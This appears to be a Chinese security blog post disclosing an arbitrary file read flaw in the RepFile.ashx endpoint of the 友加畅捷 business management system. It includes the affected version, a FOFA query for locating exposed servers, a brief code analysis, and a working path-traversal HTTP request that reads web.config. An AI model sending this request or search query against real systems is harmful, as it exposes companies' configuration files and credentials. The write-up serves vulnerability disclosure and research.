---
title: "友加畅捷管理系统 RepFile.ashx 文件读取漏洞"
source: https://mrxn.net/jswz/youjiasoft-ReportDesign-RepFile-fileread.html
asset_dir: assets/友加畅捷管理系统-repfile.ashx-文件读取漏洞
---

# 友加畅捷管理系统 RepFile.ashx 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/7 08:31
* 577浏览
* [0评论](#comment)
* 8分钟阅读

深入探索

软件

授权

服务器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理软件，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。

漏洞修复方案

该系统的 `RepFile.ashx` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。攻击者可利用此漏洞，未经授权地读取服务器上的任意文件，包括但不限于系统配置文件和数据库配置文件等敏感信息。 成功利用此漏洞可能导致企业内部敏感数据泄露，对系统的机密性和完整性构成潜在威胁。

# 影响版本

18.8000.1083.1000

# fofa语法

> icon\_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="

# 漏洞分析

深入探索

数据库

SQL注入检测工具

文件大小转换

直接查看 `/ReportDesign/RepFile.ashx` 代码执行逻辑

物流软件安全

[![友加畅捷管理系统 RepFile.ashx 文件读取漏洞](images/img-001-77a84b47a87d.webp)](https://image.mrxn.net/dda141c1851246fc9d527b635d77ffc0.webp)

根据参数`Type` 进入不同的处理逻辑，当`Type=ReadReportCpfFile` 时，看下它的实现逻辑

深入探索

SQL注入防护

安全工具开发

Web安全书籍

[![友加畅捷管理系统 RepFile.ashx 文件读取漏洞](images/img-002-af267d07ab9e.webp)](https://image.mrxn.net/92fb97a4c32542afac26bcca82cc625a.webp)

`RepFile`参数直接被拼接进系统`Report`目录下，然后使用`xmlDoc.Load()` 加载文件后将其内容直接在响应里回显`xmlDoc.Load()` 加载后的文件内容。但是`xmlDoc.Load()` 只能解析XML文件，不能读取其他文件，因此这个[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞利用有限。

网络安全

# 漏洞复现

```
POST /ReportDesign/RepFile.ashx HTTP/1.1
Host: youjiasoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

RepFile=..%2fweb.config&Type=ReadReportCpfFile
```

[![友加畅捷管理系统 RepFile.ashx 文件读取漏洞](images/img-003-83073d4a38e4.webp)](https://image.mrxn.net/a753758b5b5e4773a3f7c17e50296a73.webp)

成功读取到 `web.config` 文件内容。

计算机服务器

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[友加畅捷管理系统 RepFile.ashx 文件读取漏洞](https://mrxn.net/jswz/youjiasoft-ReportDesign-RepFile-fileread.html)  
文章链接：<https://mrxn.net/jswz/youjiasoft-ReportDesign-RepFile-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/youjiasoft-ReportDesign-RepFile-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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